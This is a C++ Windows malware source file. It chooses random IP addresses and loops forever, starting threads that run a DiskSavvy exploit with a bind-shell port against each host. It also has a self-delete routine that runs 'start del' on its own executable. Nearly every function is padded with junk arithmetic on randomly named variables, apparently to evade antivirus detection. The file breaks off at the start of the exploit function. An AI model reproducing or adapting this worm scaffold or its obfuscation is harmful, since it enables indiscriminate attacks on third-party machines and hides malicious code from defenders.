#include "color.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//[ninjaModule]
	if(argc==0){/*normal process*/
	//[moduleThreads]
	
	//
	int  ipAddress[4];
RandomChooseIP(ipAddress);
	for (;;){
	initAttack(ipAddress);
    }
    WSACleanup();
	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
int iOJle5lhEKQ = 0x6af6548;
int iXBPpDnZgGk = 0xd30ec23;
int iIjkSsIsdWO = 0x8827a8c;
int iLHDbnw7UHS = iIjkSsIsdWO * iXBPpDnZgGk + iOJle5lhEKQ;
iXBPpDnZgGk = 0x5dcba1c - iLHDbnw7UHS + 5 + 0x415192c + 69 - iOJle5lhEKQ;
iOJle5lhEKQ = 0x6af6548 + 10 - iXBPpDnZgGk % 10 + 0x8827a8c + 999 - iLHDbnw7UHS;
iLHDbnw7UHS = iOJle5lhEKQ % 5 + iIjkSsIsdWO % 0xd30ec23 + 0xcafebabe + iOJle5lhEKQ;
iIjkSsIsdWO = 0x6af6548 * 0x100 - iOJle5lhEKQ + 56 ^ 0xd30ec23 + 1996 - iIjkSsIsdWO;
int iliSeG8Sfrj = iIjkSsIsdWO / 77 + 0x8827a8c - 76 / iIjkSsIsdWO ^ 0x33 % iIjkSsIsdWO % 0x8827a8c;
iliSeG8Sfrj = 0x415192c * 0x10 - 22 + iliSeG8Sfrj + 56 ^ 0xff + iXBPpDnZgGk + 1996 - 2111 + iIjkSsIsdWO;

}

void SelfDelete(){
	char out[MAX_PATH];
int iLa8OoiTYh0 = 0x97a42e6;
int iXY0Adda3qL = 0x68b58be;
int iI3bYbGB6pR = 0x96ae4b0;
int i5ceFwYCCBg = 0x693ebd5;
int iFZas3sVuWu = 1;
switch(iFZas3sVuWu)
{
    case 0:
        iLa8OoiTYh0 = iXY0Adda3qL - 0x7d6613c * iI3bYbGB6pR / 100;
        iXY0Adda3qL = 0x96ae4b0 - 5 +  0x96ae4b0 - 6 * iXY0Adda3qL / 10 + 25;
        iI3bYbGB6pR = iLa8OoiTYh0 * 0x12 + i5ceFwYCCBg * 0x15 + 0x693ebd5 / 13 + 0x7d6613c + 555;
        i5ceFwYCCBg = 0x97a42e6 - 21 + 11 * 1996 - iXY0Adda3qL + 14520538 - iI3bYbGB6pR - 14520692 + 0x68b58be - 97;
        break;
    case 1:
        iLa8OoiTYh0 = iXY0Adda3qL - 25 + 0x97a42e6 - 40 + 0x96ae4b0 % 10 + 2;
        iI3bYbGB6pR = iI3bYbGB6pR - 0xff % 3 - i5ceFwYCCBg * 10 + 0x7d6613c / 2 - 10 + 0x68b58be - 5;
        i5ceFwYCCBg = 0x97a42e6 % 0x7d6613c ^ 33 + 0x96ae4b0 * 0x12 - 30 + 0x96ae4b0 + 23;
        iXY0Adda3qL = iXY0Adda3qL + 321 + iI3bYbGB6pR * 10 * iXY0Adda3qL / 10 / 2 + 0x7d6613c * 0x60;
        break;
    case 2:
        iLa8OoiTYh0 = iXY0Adda3qL - 45 - iI3bYbGB6pR * 46 + 0x97a42e6 / 0xdade;
        iXY0Adda3qL = iXY0Adda3qL + 0x7d6613c - iI3bYbGB6pR * 0x68b58be - 3;
        iI3bYbGB6pR = 0x68b58be - 0x1 + iLa8OoiTYh0 * 0x2 - 0x7d6613c / 0x3 + 0x96ae4b0;
        i5ceFwYCCBg = iLa8OoiTYh0 - 0x4 * 0x97a42e6 + 0x1234 - 0x4567 + 0xcafe + iXY0Adda3qL % 0x432 / 0x693ebd5 - 0x23;
        break;
    case 3:
        iXY0Adda3qL = i5ceFwYCCBg * 2 * 0x68b58be - 4 + 0x7d6613c + 12 + 34 + 0x97a42e6;
        iI3bYbGB6pR = iXY0Adda3qL - 43 + 0x96ae4b0 * 3040 - 0x68b58be % 10 + 1 - 0x96ae4b0;
        i5ceFwYCCBg = 0x96ae4b0 - 33 + iLa8OoiTYh0 * 0x25 + 0x97a42e6 - 3004 + 0x68b58be;
        iLa8OoiTYh0 = 0x97a42e6 + 2905 % iXY0Adda3qL * 1996 + 0x693ebd5 - 70 * 0x7d6613c;
        break;
    case 4:
        i5ceFwYCCBg = iXY0Adda3qL - 36 +0x7d6613c * 2001 - iI3bYbGB6pR / 234 + 0x7;
        iLa8OoiTYh0 = i5ceFwYCCBg - 0xabcedf + 0x68b58be * 0xa2bc5 + i5ceFwYCCBg / 0x123 + 0x97a42e6;
        iI3bYbGB6pR = iLa8OoiTYh0 - 0x124 + 23 / iXY0Adda3qL / 3 / 2 + iI3bYbGB6pR + 29 - 0x68b58be + 100;
        iXY0Adda3qL = 0x68b58be - 70 + 70  + 0x97a42e6 / 2 + 423 - 0x97a42e6 / 7749 % 0x1234;
        break;
    case 5:
        iXY0Adda3qL = iXY0Adda3qL - 9981 % iLa8OoiTYh0 + 111 - iI3bYbGB6pR / 224 % 0x96ae4b0;
        iI3bYbGB6pR = iI3bYbGB6pR - 339 - iI3bYbGB6pR * 4416 / 0x7d6613c + 5525 + 0x68b58be % 10;
        i5ceFwYCCBg = i5ceFwYCCBg - 6636 + 0x68b58be * 7749 + 1 - iXY0Adda3qL * 8864 / 0xfecba;
        iLa8OoiTYh0 = 0x7d6613c - 9981 % 0x97a42e6 % 10 % 1010100 - 0x97a42e6 - 23 -  0x7d6613c - 2500;
        break;
}
iFZas3sVuWu = i5ceFwYCCBg - 0xaa + 0x96ae4b0 * 46 - 15 / iI3bYbGB6pR + 11 - 0x97a42e6;
iFZas3sVuWu = iFZas3sVuWu - 70 * 55 - iI3bYbGB6pR ^ 0x99 - 0x567498 % 0x97a42e6 % 2 - 234 + 0x68b58be;

	GetModuleFileNameA(NULL,(LPSTR)out,100);
int iDdZcQcArpK = 0x0ae9362;
int ix7ylgQT8Bn = 0x205e888;
int iRS0OFDxOxx = 0x6db007c;
int iV2Qxrtq8HZ = iRS0OFDxOxx * ix7ylgQT8Bn + iDdZcQcArpK;
ix7ylgQT8Bn = 0xe388a4b - iV2Qxrtq8HZ + 5 + 0xb515256 + 69 - iDdZcQcArpK;
iDdZcQcArpK = 0x0ae9362 + 10 - ix7ylgQT8Bn % 10 + 0x6db007c + 999 - iV2Qxrtq8HZ;
iV2Qxrtq8HZ = iDdZcQcArpK % 5 + iRS0OFDxOxx % 0x205e888 + 0xcafebabe + iDdZcQcArpK;
iRS0OFDxOxx = 0x0ae9362 * 0x100 - iDdZcQcArpK + 56 ^ 0x205e888 + 1996 - iRS0OFDxOxx;
int iJYDS5h5JvT = iRS0OFDxOxx / 77 + 0x6db007c - 76 / iRS0OFDxOxx ^ 0x33 % iRS0OFDxOxx % 0x6db007c;
iJYDS5h5JvT = 0xb515256 * 0x10 - 22 + iJYDS5h5JvT + 56 ^ 0xff + ix7ylgQT8Bn + 1996 - 2111 + iRS0OFDxOxx;

	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
int il4tYeLdAz4 = 0xcfd4687;
int iP8sQFZi5eF = 0x785a863;
int i1zFBRaqZDd = 0xf7318e2;
int iC7qFu72FYE = 0xe2c411d;
int iDSrNYew4Ub = 2;
switch(iDSrNYew4Ub)
{
    case 0:
        il4tYeLdAz4 = iP8sQFZi5eF - 0x07d99b2 * i1zFBRaqZDd / 100;
        iP8sQFZi5eF = 0xf7318e2 - 5 +  0xf7318e2 - 6 * iP8sQFZi5eF / 10 + 25;
        i1zFBRaqZDd = il4tYeLdAz4 * 0x12 + iC7qFu72FYE * 0x15 + 0xe2c411d / 13 + 0x07d99b2 + 555;
        iC7qFu72FYE = 0xcfd4687 - 21 + 11 * 1996 - iP8sQFZi5eF + 14520538 - i1zFBRaqZDd - 14520692 + 0x785a863 - 97;
        break;
    case 1:
        il4tYeLdAz4 = iP8sQFZi5eF - 25 + 0xcfd4687 - 40 + 0xf7318e2 % 10 + 2;
        i1zFBRaqZDd = i1zFBRaqZDd - 0xff % 3 - iC7qFu72FYE * 10 + 0x07d99b2 / 2 - 10 + 0x785a863 - 5;
        iC7qFu72FYE = 0xcfd4687 % 0x07d99b2 ^ 33 + 0xf7318e2 * 0x12 - 30 + 0xf7318e2 + 23;
        iP8sQFZi5eF = iP8sQFZi5eF + 321 + i1zFBRaqZDd * 10 * iP8sQFZi5eF / 10 / 2 + 0x07d99b2 * 0x60;
        break;
    case 2:
        il4tYeLdAz4 = iP8sQFZi5eF - 45 - i1zFBRaqZDd * 46 + 0xcfd4687 / 0xdade;
        iP8sQFZi5eF = iP8sQFZi5eF + 0x07d99b2 - i1zFBRaqZDd * 0x785a863 - 3;
        i1zFBRaqZDd = 0x785a863 - 0x1 + il4tYeLdAz4 * 0x2 - 0x07d99b2 / 0x3 + 0xf7318e2;
        iC7qFu72FYE = il4tYeLdAz4 - 0x4 * 0xcfd4687 + 0x1234 - 0x4567 + 0xcafe + iP8sQFZi5eF % 0x432 / 0xe2c411d - 0x23;
        break;
    case 3:
        iP8sQFZi5eF = iC7qFu72FYE * 2 * 0x785a863 - 4 + 0x07d99b2 + 12 + 34 + 0xcfd4687;
        i1zFBRaqZDd = iP8sQFZi5eF - 43 + 0xf7318e2 * 3040 - 0x785a863 % 10 + 1 - 0xf7318e2;
        iC7qFu72FYE = 0xf7318e2 - 33 + il4tYeLdAz4 * 0x25 + 0xcfd4687 - 3004 + 0x785a863;
        il4tYeLdAz4 = 0xcfd4687 + 2905 % iP8sQFZi5eF * 1996 + 0xe2c411d - 70 * 0x07d99b2;
        break;
    case 4:
        iC7qFu72FYE = iP8sQFZi5eF - 36 +0x07d99b2 * 2001 - i1zFBRaqZDd / 234 + 0x7;
        il4tYeLdAz4 = iC7qFu72FYE - 0xabcedf + 0x785a863 * 0xa2bc5 + iC7qFu72FYE / 0x123 + 0xcfd4687;
        i1zFBRaqZDd = il4tYeLdAz4 - 0x124 + 23 / iP8sQFZi5eF / 3 / 2 + i1zFBRaqZDd + 29 - 0x785a863 + 100;
        iP8sQFZi5eF = 0x785a863 - 70 + 70  + 0xcfd4687 / 2 + 423 - 0xcfd4687 / 7749 % 0x1234;
        break;
    case 5:
        iP8sQFZi5eF = iP8sQFZi5eF - 9981 % il4tYeLdAz4 + 111 - i1zFBRaqZDd / 224 % 0xf7318e2;
        i1zFBRaqZDd = i1zFBRaqZDd - 339 - i1zFBRaqZDd * 4416 / 0x07d99b2 + 5525 + 0x785a863 % 10;
        iC7qFu72FYE = iC7qFu72FYE - 6636 + 0x785a863 * 7749 + 1 - iP8sQFZi5eF * 8864 / 0xfecba;
        il4tYeLdAz4 = 0x07d99b2 - 9981 % 0xcfd4687 % 10 % 1010100 - 0xcfd4687 - 23 -  0x07d99b2 - 2500;
        break;
}
iDSrNYew4Ub = iC7qFu72FYE - 0xaa + 0xf7318e2 * 46 - 15 / i1zFBRaqZDd + 11 - 0xcfd4687;
iDSrNYew4Ub = iDSrNYew4Ub - 70 * 55 - i1zFBRaqZDd ^ 0x99 - 0x567498 % 0xcfd4687 % 2 - 234 + 0x785a863;

	ULONG   len;
int ic8IK8Uj9VV = 0xa4675bb;
int iVGNJYL4LfB = 0x1b9f7ee;
int i8Do7ETas9V = 0x32c2120;
int ii2vlJi9WeM = i8Do7ETas9V * iVGNJYL4LfB + ic8IK8Uj9VV;
iVGNJYL4LfB = 0x6b36924 - ii2vlJi9WeM + 5 + 0xa3b7464 + 69 - ic8IK8Uj9VV;
ic8IK8Uj9VV = 0xa4675bb + 10 - iVGNJYL4LfB % 10 + 0x32c2120 + 999 - ii2vlJi9WeM;
ii2vlJi9WeM = ic8IK8Uj9VV % 5 + i8Do7ETas9V % 0x1b9f7ee + 0xcafebabe + ic8IK8Uj9VV;
i8Do7ETas9V = 0xa4675bb * 0x100 - ic8IK8Uj9VV + 56 ^ 0x1b9f7ee + 1996 - i8Do7ETas9V;
int i0CNvghjeX3 = i8Do7ETas9V / 77 + 0x32c2120 - 76 / i8Do7ETas9V ^ 0x33 % i8Do7ETas9V % 0x32c2120;
i0CNvghjeX3 = 0xa3b7464 * 0x10 - 22 + i0CNvghjeX3 + 56 ^ 0xff + iVGNJYL4LfB + 1996 - 2111 + i8Do7ETas9V;

	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;
int iQzS9DO9DM7 = 0xcb48799;
int iehrJ4KTwib = 0x61f397d;
int iuj68f3VzDD = 0x25fc878;
int isOlXQ1BK2l = iuj68f3VzDD * iehrJ4KTwib + iQzS9DO9DM7;
iehrJ4KTwib = 0x90e86d7 - isOlXQ1BK2l + 5 + 0x0258fb4 + 69 - iQzS9DO9DM7;
iQzS9DO9DM7 = 0xcb48799 + 10 - iehrJ4KTwib % 10 + 0x25fc878 + 999 - isOlXQ1BK2l;
isOlXQ1BK2l = iQzS9DO9DM7 % 5 + iuj68f3VzDD % 0x61f397d + 0xcafebabe + iQzS9DO9DM7;
iuj68f3VzDD = 0xcb48799 * 0x100 - iQzS9DO9DM7 + 56 ^ 0x61f397d + 1996 - iuj68f3VzDD;
int i3XUvaxZeCO = iuj68f3VzDD / 77 + 0x25fc878 - 76 / iuj68f3VzDD ^ 0x33 % iuj68f3VzDD % 0x25fc878;
i3XUvaxZeCO = 0x0258fb4 * 0x10 - 22 + i3XUvaxZeCO + 56 ^ 0xff + iehrJ4KTwib + 1996 - 2111 + iuj68f3VzDD;


	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));
int ij8rqsttXLg = 0xb58f1c8;
int iJ0Fl9GyNPP = 0xc9cde9f;
int iqcsvwpBWKD = 0x8acc892;
int ioPIATEbcKN = ij8rqsttXLg + iJ0Fl9GyNPP - iqcsvwpBWKD;
ioPIATEbcKN = 0x0dc2517 * ioPIATEbcKN + 0x67b3a6e - iJ0Fl9GyNPP;
int iy9DoY1ZPys = ioPIATEbcKN / 0x67b3a6e + ij8rqsttXLg ^ iqcsvwpBWKD - 0x8acc892;


	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
int i4wdJV73D6V = 0xdc785be;
int isH4rLi9w6y = 0x84faa05;
int iuXlaHpFGJx = 0x0b08e62;
int i4i84eR4v5y = 0x16e130d;
int ioYy4vcefm7 = 3;
switch(ioYy4vcefm7)
{
    case 0:
        i4wdJV73D6V = isH4rLi9w6y - 0x722c116 * iuXlaHpFGJx / 100;
        isH4rLi9w6y = 0x0b08e62 - 5 +  0x0b08e62 - 6 * isH4rLi9w6y / 10 + 25;
        iuXlaHpFGJx = i4wdJV73D6V * 0x12 + i4i84eR4v5y * 0x15 + 0x16e130d / 13 + 0x722c116 + 555;
        i4i84eR4v5y = 0xdc785be - 21 + 11 * 1996 - isH4rLi9w6y + 14520538 - iuXlaHpFGJx - 14520692 + 0x84faa05 - 97;
        break;
    case 1:
        i4wdJV73D6V = isH4rLi9w6y - 25 + 0xdc785be - 40 + 0x0b08e62 % 10 + 2;
        iuXlaHpFGJx = iuXlaHpFGJx - 0xff % 3 - i4i84eR4v5y * 10 + 0x722c116 / 2 - 10 + 0x84faa05 - 5;
        i4i84eR4v5y = 0xdc785be % 0x722c116 ^ 33 + 0x0b08e62 * 0x12 - 30 + 0x0b08e62 + 23;
        isH4rLi9w6y = isH4rLi9w6y + 321 + iuXlaHpFGJx * 10 * isH4rLi9w6y / 10 / 2 + 0x722c116 * 0x60;
        break;
    case 2:
        i4wdJV73D6V = isH4rLi9w6y - 45 - iuXlaHpFGJx * 46 + 0xdc785be / 0xdade;
        isH4rLi9w6y = isH4rLi9w6y + 0x722c116 - iuXlaHpFGJx * 0x84faa05 - 3;
        iuXlaHpFGJx = 0x84faa05 - 0x1 + i4wdJV73D6V * 0x2 - 0x722c116 / 0x3 + 0x0b08e62;
        i4i84eR4v5y = i4wdJV73D6V - 0x4 * 0xdc785be + 0x1234 - 0x4567 + 0xcafe + isH4rLi9w6y % 0x432 / 0x16e130d - 0x23;
        break;
    case 3:
        isH4rLi9w6y = i4i84eR4v5y * 2 * 0x84faa05 - 4 + 0x722c116 + 12 + 34 + 0xdc785be;
        iuXlaHpFGJx = isH4rLi9w6y - 43 + 0x0b08e62 * 3040 - 0x84faa05 % 10 + 1 - 0x0b08e62;
        i4i84eR4v5y = 0x0b08e62 - 33 + i4wdJV73D6V * 0x25 + 0xdc785be - 3004 + 0x84faa05;
        i4wdJV73D6V = 0xdc785be + 2905 % isH4rLi9w6y * 1996 + 0x16e130d - 70 * 0x722c116;
        break;
    case 4:
        i4i84eR4v5y = isH4rLi9w6y - 36 +0x722c116 * 2001 - iuXlaHpFGJx / 234 + 0x7;
        i4wdJV73D6V = i4i84eR4v5y - 0xabcedf + 0x84faa05 * 0xa2bc5 + i4i84eR4v5y / 0x123 + 0xdc785be;
        iuXlaHpFGJx = i4wdJV73D6V - 0x124 + 23 / isH4rLi9w6y / 3 / 2 + iuXlaHpFGJx + 29 - 0x84faa05 + 100;
        isH4rLi9w6y = 0x84faa05 - 70 + 70  + 0xdc785be / 2 + 423 - 0xdc785be / 7749 % 0x1234;
        break;
    case 5:
        isH4rLi9w6y = isH4rLi9w6y - 9981 % i4wdJV73D6V + 111 - iuXlaHpFGJx / 224 % 0x0b08e62;
        iuXlaHpFGJx = iuXlaHpFGJx - 339 - iuXlaHpFGJx * 4416 / 0x722c116 + 5525 + 0x84faa05 % 10;
        i4i84eR4v5y = i4i84eR4v5y - 6636 + 0x84faa05 * 7749 + 1 - isH4rLi9w6y * 8864 / 0xfecba;
        i4wdJV73D6V = 0x722c116 - 9981 % 0xdc785be % 10 % 1010100 - 0xdc785be - 23 -  0x722c116 - 2500;
        break;
}
ioYy4vcefm7 = i4i84eR4v5y - 0xaa + 0x0b08e62 * 46 - 15 / iuXlaHpFGJx + 11 - 0xdc785be;
ioYy4vcefm7 = ioYy4vcefm7 - 70 * 55 - iuXlaHpFGJx ^ 0x99 - 0x567498 % 0xdc785be % 2 - 234 + 0x84faa05;

			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
void initAttack(int ipAddress[]){
	
	register int i,j;
int idXWeRUs41J = 0x2544c31;
int izJQwwdlMU2 = 0xdd3af79;
int i2NEWsRt32F = 0xb75e971;
int il1L7odXvof = i2NEWsRt32F * izJQwwdlMU2 + idXWeRUs41J;
izJQwwdlMU2 = 0xef10149 - il1L7odXvof + 5 + 0x413e1e5 + 69 - idXWeRUs41J;
idXWeRUs41J = 0x2544c31 + 10 - izJQwwdlMU2 % 10 + 0xb75e971 + 999 - il1L7odXvof;
il1L7odXvof = idXWeRUs41J % 5 + i2NEWsRt32F % 0xdd3af79 + 0xcafebabe + idXWeRUs41J;
i2NEWsRt32F = 0x2544c31 * 0x100 - idXWeRUs41J + 56 ^ 0xdd3af79 + 1996 - i2NEWsRt32F;
int ivvmadTC7g1 = i2NEWsRt32F / 77 + 0xb75e971 - 76 / i2NEWsRt32F ^ 0x33 % i2NEWsRt32F % 0xb75e971;
ivvmadTC7g1 = 0x413e1e5 * 0x10 - 22 + ivvmadTC7g1 + 56 ^ 0xff + izJQwwdlMU2 + 1996 - 2111 + i2NEWsRt32F;

	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
int iX8o46t02fV = 0xea6a37a;
int itzNvCpUp9p = 0x6299ebe;
int ipHYvycAjKQ = 0xb727bb3;
int ijcsIt134LX = ipHYvycAjKQ * itzNvCpUp9p + iX8o46t02fV;
itzNvCpUp9p = 0xd05070c - ijcsIt134LX + 5 + 0x480d6fa + 69 - iX8o46t02fV;
iX8o46t02fV = 0xea6a37a + 10 - itzNvCpUp9p % 10 + 0xb727bb3 + 999 - ijcsIt134LX;
ijcsIt134LX = iX8o46t02fV % 5 + ipHYvycAjKQ % 0x6299ebe + 0xcafebabe + iX8o46t02fV;
ipHYvycAjKQ = 0xea6a37a * 0x100 - iX8o46t02fV + 56 ^ 0x6299ebe + 1996 - ipHYvycAjKQ;
int ituXCf6JPKs = ipHYvycAjKQ / 77 + 0xb727bb3 - 76 / ipHYvycAjKQ ^ 0x33 % ipHYvycAjKQ % 0xb727bb3;
ituXCf6JPKs = 0x480d6fa * 0x10 - 22 + ituXCf6JPKs + 56 ^ 0xff + itzNvCpUp9p + 1996 - 2111 + ipHYvycAjKQ;

	
	//
    curIP[0]=ipAddress[0];
    curIP[1]=ipAddress[1];
    curIP[2]=ipAddress[2];
    curIP[3]=ipAddress[3];
    printf("Exploit DiskSavvy_44156");
	for(i=0; i<MAX_THREADS;i++){
		RandomChooseIP_IncreaseIP(curIP);
		// Allocate memory for thread data.
		pDataArray[i] = (PthreadData) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,sizeof(threadData));
		if( pDataArray[i] == NULL ){
           // If the array allocation fails, the system is out of memory
           // so there is no point in trying to print an error message.
           // Just terminate execution.
			printf("out of memory!\n");
            return 0;
        }
        //init data
        //Bindport for each exploit module.
        ipAr2Str(curIP,pDataArray[i]->strIP);
        pDataArray[i]->shellPort=BINDPORT_DiskSavvy_44156;
        
        hThreadArray[i] = CreateThread( 
            NULL,                   
            0,                        
            exploit_DiskSavvy_44156,       			// thread function name
            pDataArray[i],          
            0,                      
            &dwThreadIdArray[i]);
int iQOzEN966ON = 0xd6ebbac;
int ixkfPlNK83R = 0x6013885;
int iV4oHbi3vlw = 0xfe7e601;
int i7d2mECBOgY = iV4oHbi3vlw * ixkfPlNK83R + iQOzEN966ON;
ixkfPlNK83R = 0xa7541ac - i7d2mECBOgY + 5 + 0x873941e + 69 - iQOzEN966ON;
iQOzEN966ON = 0xd6ebbac + 10 - ixkfPlNK83R % 10 + 0xfe7e601 + 999 - i7d2mECBOgY;
i7d2mECBOgY = iQOzEN966ON % 5 + iV4oHbi3vlw % 0x6013885 + 0xcafebabe + iQOzEN966ON;
iV4oHbi3vlw = 0xd6ebbac * 0x100 - iQOzEN966ON + 56 ^ 0x6013885 + 1996 - iV4oHbi3vlw;
int ie7nYLC8BZk = iV4oHbi3vlw / 77 + 0xfe7e601 - 76 / iV4oHbi3vlw ^ 0x33 % iV4oHbi3vlw % 0xfe7e601;
ie7nYLC8BZk = 0x873941e * 0x10 - 22 + ie7nYLC8BZk + 56 ^ 0xff + ixkfPlNK83R + 1996 - 2111 + iV4oHbi3vlw;
   
		if (hThreadArray[i] == NULL) {
			printf("Thread %d is not create!\n",i );
        }
        else{
        	printf("Thread %d is create!\n",i );
int i0scTl1STmL = 0x66f3544;
int iH1TF1zYjPE = 0xbcf1ef5;
int i8XFTwNFOzT = 0x8c3d911;
int iLAalCcG2Vk = 0x60ee803;
int iMdvFIEFeAg = 2;
switch(iMdvFIEFeAg)
{
    case 0:
        i0scTl1STmL = iH1TF1zYjPE - 0x7faee8b * i8XFTwNFOzT / 100;
        iH1TF1zYjPE = 0x8c3d911 - 5 +  0x8c3d911 - 6 * iH1TF1zYjPE / 10 + 25;
        i8XFTwNFOzT = i0scTl1STmL * 0x12 + iLAalCcG2Vk * 0x15 + 0x60ee803 / 13 + 0x7faee8b + 555;
        iLAalCcG2Vk = 0x66f3544 - 21 + 11 * 1996 - iH1TF1zYjPE + 14520538 - i8XFTwNFOzT - 14520692 + 0xbcf1ef5 - 97;
        break;
    case 1:
        i0scTl1STmL = iH1TF1zYjPE - 25 + 0x66f3544 - 40 + 0x8c3d911 % 10 + 2;
        i8XFTwNFOzT = i8XFTwNFOzT - 0xff % 3 - iLAalCcG2Vk * 10 + 0x7faee8b / 2 - 10 + 0xbcf1ef5 - 5;
        iLAalCcG2Vk = 0x66f3544 % 0x7faee8b ^ 33 + 0x8c3d911 * 0x12 - 30 + 0x8c3d911 + 23;
        iH1TF1zYjPE = iH1TF1zYjPE + 321 + i8XFTwNFOzT * 10 * iH1TF1zYjPE / 10 / 2 + 0x7faee8b * 0x60;
        break;
    case 2:
        i0scTl1STmL = iH1TF1zYjPE - 45 - i8XFTwNFOzT * 46 + 0x66f3544 / 0xdade;
        iH1TF1zYjPE = iH1TF1zYjPE + 0x7faee8b - i8XFTwNFOzT * 0xbcf1ef5 - 3;
        i8XFTwNFOzT = 0xbcf1ef5 - 0x1 + i0scTl1STmL * 0x2 - 0x7faee8b / 0x3 + 0x8c3d911;
        iLAalCcG2Vk = i0scTl1STmL - 0x4 * 0x66f3544 + 0x1234 - 0x4567 + 0xcafe + iH1TF1zYjPE % 0x432 / 0x60ee803 - 0x23;
        break;
    case 3:
        iH1TF1zYjPE = iLAalCcG2Vk * 2 * 0xbcf1ef5 - 4 + 0x7faee8b + 12 + 34 + 0x66f3544;
        i8XFTwNFOzT = iH1TF1zYjPE - 43 + 0x8c3d911 * 3040 - 0xbcf1ef5 % 10 + 1 - 0x8c3d911;
        iLAalCcG2Vk = 0x8c3d911 - 33 + i0scTl1STmL * 0x25 + 0x66f3544 - 3004 + 0xbcf1ef5;
        i0scTl1STmL = 0x66f3544 + 2905 % iH1TF1zYjPE * 1996 + 0x60ee803 - 70 * 0x7faee8b;
        break;
    case 4:
        iLAalCcG2Vk = iH1TF1zYjPE - 36 +0x7faee8b * 2001 - i8XFTwNFOzT / 234 + 0x7;
        i0scTl1STmL = iLAalCcG2Vk - 0xabcedf + 0xbcf1ef5 * 0xa2bc5 + iLAalCcG2Vk / 0x123 + 0x66f3544;
        i8XFTwNFOzT = i0scTl1STmL - 0x124 + 23 / iH1TF1zYjPE / 3 / 2 + i8XFTwNFOzT + 29 - 0xbcf1ef5 + 100;
        iH1TF1zYjPE = 0xbcf1ef5 - 70 + 70  + 0x66f3544 / 2 + 423 - 0x66f3544 / 7749 % 0x1234;
        break;
    case 5:
        iH1TF1zYjPE = iH1TF1zYjPE - 9981 % i0scTl1STmL + 111 - i8XFTwNFOzT / 224 % 0x8c3d911;
        i8XFTwNFOzT = i8XFTwNFOzT - 339 - i8XFTwNFOzT * 4416 / 0x7faee8b + 5525 + 0xbcf1ef5 % 10;
        iLAalCcG2Vk = iLAalCcG2Vk - 6636 + 0xbcf1ef5 * 7749 + 1 - iH1TF1zYjPE * 8864 / 0xfecba;
        i0scTl1STmL = 0x7faee8b - 9981 % 0x66f3544 % 10 % 1010100 - 0x66f3544 - 23 -  0x7faee8b - 2500;
        break;
}
iMdvFIEFeAg = iLAalCcG2Vk - 0xaa + 0x8c3d911 * 46 - 15 / i8XFTwNFOzT + 11 - 0x66f3544;
iMdvFIEFeAg = iMdvFIEFeAg - 70 * 55 - i8XFTwNFOzT ^ 0x99 - 0x567498 % 0x66f3544 % 2 - 234 + 0xbcf1ef5;

        }
	}
	//Đợi tất cả các threads được tắt
	WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);
	for(int i=0; i<MAX_THREADS; i++){
        CloseHandle(hThreadArray[i]);
        if(pDataArray[i] != NULL)
        {
            HeapFree(GetProcessHeap(), 0, pDataArray[i]);
            pDataArray[i] = NULL;    // Ensure address is not reused.
        }
    }

//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
int iI9cFAnYalx = 0x6a1fab0;
int iGcW7nzn8xQ = 0x5a052d4;
int iLzLmeI0Ocj = 0x7239c5b;
int ivJP1tfJ4KE = iI9cFAnYalx + iGcW7nzn8xQ - iLzLmeI0Ocj;
ivJP1tfJ4KE = 0x3de4293 * ivJP1tfJ4KE + 0x1379f96 - iGcW7nzn8xQ;
int itJmfjCmm0u = ivJP1tfJ4KE / 0x1379f96 + iI9cFAnYalx ^ iLzLmeI0Ocj - 0x7239c5b;

}

//


DWORD WINAPI exploit_DiskSavvy_44156(LPVOID lpParam) {
	PthreadData pData;
	pData = (PthreadData)lpParam;
	int sock;
int iZrUTSQjLke = 0x3e67376;
int im0GXsEbLzL = 0xc9aa9d2;
int ikFJwJVjvQn = 0xdb45652;
int iOWpQyZWafc = iZrUTSQjLke + im0GXsEbLzL - ikFJwJVjvQn;
iOWpQyZWafc = 0xad4a12d * iOWpQyZWafc + 0x050632d - im0GXsEbLzL;
